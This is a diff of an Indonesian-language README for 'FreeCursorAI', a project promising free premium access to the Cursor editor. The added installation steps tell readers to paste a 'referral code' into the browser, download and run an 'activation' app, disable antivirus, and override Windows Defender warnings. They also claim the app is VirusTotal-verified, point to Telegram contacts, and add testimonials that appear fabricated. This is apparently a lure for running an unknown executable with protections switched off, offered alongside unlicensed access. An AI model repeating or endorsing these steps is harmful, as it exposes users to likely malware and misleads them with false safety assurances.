@@ -40,11 +40,39 @@ FreeCursorAI adalah solusi terpercaya untuk mengakses fitur VIP Cursor secara GR
 - 🤝 Komunitas aktif dan supportif
 - 📈 Update rutin
 
-## 🎮 Cara Mulai
-1. ⭐ Star repo ini dulu
-2. 🔄 Clone repository
-3. 📱 Gunakan kode referral teman (Gratis 15 hari VIP!)
-4. 🎉 Nikmati fitur premium!
+## 🎮 Cara Menggunakan
+1. 📋 Copy kode referral dari teman kamu
+2. 🌐 Paste kode referral di browser kamu
+3. ⬇️ Download aplikasi aktivasi Cursor VIP
+4. 💫 Jalankan aplikasi aktivasi
+5. ✨ Selamat! Cursor VIP kamu sudah aktif
+
+### 📝 Langkah Detail:
+1. **Copy Referral:**
+   - Dapatkan kode referral dari teman atau dari channel [@KiworaID_Channel](https://t.me/KiworaID_Channel)
+   - Copy kode tersebut
+
+2. **Aktivasi Referral:**
+   - Buka browser kamu (Chrome/Firefox/Edge)
+   - Paste kode referral di address bar
+   - Tekan Enter
+
+3. **Download & Install:**
+   - Klik tombol download yang muncul
+   - Tunggu proses download selesai
+   - Buka file yang sudah didownload
+   - Ikuti panduan instalasi
+
+4. **Aktivasi VIP:**
+   - Jalankan aplikasi aktivasi
+   - Tunggu proses aktivasi selesai (± 1 menit)
+   - Cursor VIP akan aktif otomatis
+
+### ⚡ Tips:
+- Pastikan antivirus dimatikan sementara saat instalasi
+- Jika ada peringatan Windows Defender, klik 'More Info' → 'Run Anyway'
+- Aplikasi aman dan sudah diverifikasi VirusTotal
+- Butuh bantuan? Hubungi [@KiworaID](https://t.me/KiworaID)
 
 ## 💻 Persyaratan Minimal
 - Windows/Mac/Linux
@@ -53,14 +81,17 @@ FreeCursorAI adalah solusi terpercaya untuk mengakses fitur VIP Cursor secara GR
 - Git terinstall
 
 ## 🤝 Bergabung dengan Komunitas
-- 💬 [Grup Telegram Utama](https://t.me/KiworaID)
+- 💬 [Telegram](https://t.me/KiworaID)
 - 📱 [Channel Telegram Updates](https://t.me/KiworaID_Channel)
-- 📺 [YouTube Tutorial](https://youtube.com/@freecursorai)
 
 ## 🌟 Testimoni Pengguna
-> "Saya sudah menggunakan FreeCursorAI selama 3 bulan dan hasilnya luar biasa!" - @developer123
+> "Awalnya ragu, tapi setelah pakai FreeCursorAI coding jadi jauh lebih cepat. Worth it banget!" - @fadhildev
 
-> "Setup mudah dan 100% aman. Recommended!" - @techie456
+> "Fitur AI-nya ngebantu banget buat debugging. Hemat waktu dan tenaga!" - @ryancode
+
+> "Baru seminggu pakai udah kerasa bedanya. Produktivitas naik drastis!" - @devina_p 
+
+> "Setup gampang, performa mantap. Recommended buat yang mau upgrade skill coding!" - @zaki_dev
 
 ## 📢 Ajak Teman, Dapat Benefit!
 1. 🎁 Kamu dapat 15 hari VIP GRATIS
